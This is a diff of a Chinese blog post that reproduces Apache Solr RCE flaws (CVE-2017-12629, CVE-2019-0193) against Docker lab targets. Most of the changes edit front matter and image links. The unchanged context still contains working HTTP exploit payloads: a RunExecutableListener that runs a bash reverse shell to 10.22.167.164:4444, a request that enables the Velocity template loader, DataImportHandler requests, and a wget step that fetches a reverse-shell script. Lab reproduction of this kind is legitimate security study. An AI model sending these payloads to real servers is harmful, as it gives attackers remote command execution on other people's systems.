@@ -1,11 +1,10 @@
 ---
-title: Apache Solr RCE漏洞复现
+title: "Apache Solr RCE漏洞复现"
 slug: apache-solr-rcelou-dong-fu-xian
 cover: ""
+date: 2026-01-09
 categories:
   - 漏洞复现
-tags:
-  - apache_shiro
 halo:
   site: http://www.hzhsec.top
   name: c43d0179-cb7e-44c7-979d-13a34660e96b
@@ -63,7 +62,7 @@ docker-compose up -d
 访问：http://靶机IP:8983
 1. 检测是否可利用
 core是否有数据,版本是否符合
-![](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Pasted%20image%2020260101154023.png)
+![[Pasted image 20260101154023.png]]
 `core selector`有数据,版本为`7.0.1`<7.1
 
 2. 发送数据包
@@ -81,9 +80,9 @@ Content-Length: 186
 {"add-listener":{"event":"postCommit","name":"newliwsten","class":"solr.RunExecutableListener","exe":"bash","dir":"/bin/","args":["-c", "bash -i >& /dev/tcp/10.22.167.164/4444 0>&1"]}}
 ```
 
-![](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Pasted%20image%2020260101155101.png)
+![[Pasted image 20260101155101.png]]
 `监听`添加上了
-![](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Pasted%20image%2020260101155027.png)
+![[Pasted image 20260101155027.png]]
 
 3. 触发监听,执行反弹命令
 ```http
@@ -100,9 +99,9 @@ Content-Length: 15
 
 [{"id":"test"}]
 ```
-![](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Pasted%20image%2020260101155625.png)
+![[Pasted image 20260101155625.png]]
 `成功`反弹:
-![](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Pasted%20image%2020260101155639.png)
+![[Pasted image 20260101155639.png]]
 
 ## 2.CVE-2019-0193
 
@@ -127,7 +126,7 @@ docker-compose up -d
 
 1. 查看是否满足利用条件
 应用开启了某个`core`,在`core admin`查看
-![](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Pasted%20image%2020260101162551.png)
+![[Pasted image 20260101162551.png]]
 2. `VelocityResponseWriter插件`默认的`params.resource.loader.enabled`是`false`需要通过`post`修改设置为`true`
 ```http
 POST /solr/demo/config HTTP/1.1
@@ -146,7 +145,7 @@ Content-Length: 259
   }
 }
 ```
-![](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Pasted%20image%2020260101162901.png)
+![[Pasted image 20260101162901.png]]
 
 2. 发送命令执行
 ```http
@@ -159,7 +158,7 @@ Accept-Encoding: gzip, deflate
 Connection: close
 Upgrade-Insecure-Requests: 1
 ```
-![](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Pasted%20image%2020260101163105.png)
+![[Pasted image 20260101163105.png]]
 
 **DataImportHandler**模块利用
 
@@ -185,7 +184,7 @@ Upgrade-Insecure-Requests: 1
 ```
 
 
-![](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Pasted%20image%2020260101173157.png)
+![[Pasted image 20260101173157.png]]
 点击 "Execute with this Configuration" 会发送以下请求：
 
 ```http
@@ -211,7 +210,7 @@ command=full-import&verbose=false&clean=false&commit=true&debug=true&core=demo&d
 docker exec -it id /bin/bash
 ls /tmp/success
 ```
-![](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Pasted%20image%2020260101173318.png)
+![[Pasted image 20260101173318.png]]
 
 尝试`rce`反弹shell,可能是编码问题,一直执行不了直接反弹命令
 发现`wget`有反应,使用`wget`下载带有反弹命令的sh脚本
@@ -223,7 +222,7 @@ bash 1.sh
 ```
 
 成功反弹
-![](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Pasted%20image%2020260101173558.png)
+![[Pasted image 20260101173558.png]]
 
 **免责声明**
 
